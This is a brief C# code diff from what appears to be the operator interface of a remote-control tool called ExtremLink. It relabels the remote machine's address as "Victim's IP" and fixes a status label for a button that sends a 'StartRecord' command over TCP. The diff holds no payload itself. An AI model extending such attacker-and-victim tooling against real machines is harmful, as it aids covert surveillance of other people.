@@ -38,10 +38,9 @@ namespace ExtremLink_Client.Pages
         public ControlPage(ContentControl contentMain)
         {
             this.contentMain = contentMain;
-            MessageBox.Show(Attacker.AttackerInstance.VictimIpAddr);
-            this.clientIpTextBlock.Text = $"Client's IP: {Attacker.AttackerInstance.VictimIpAddr}";
             this.isReceivingFrames = false;
             InitializeComponent();
+            clientIpTextBlock.Text = $"Victim's IP: {Attacker.AttackerInstance.VictimIpAddr}";
         }
 
         private void PlayBtn_Click(object sender, RoutedEventArgs e)
@@ -59,7 +58,7 @@ namespace ExtremLink_Client.Pages
         private void RecordBtn_Click(object sender, RoutedEventArgs e)
         {
             Attacker.AttackerInstance.SendTCPMessageToClient("&", "StartRecord");
-            this.clientIpTextBlock.Text = "Record: on"; 
+            this.recordingStatusTextBlock.Text = "Record: on"; 
         }
 
 
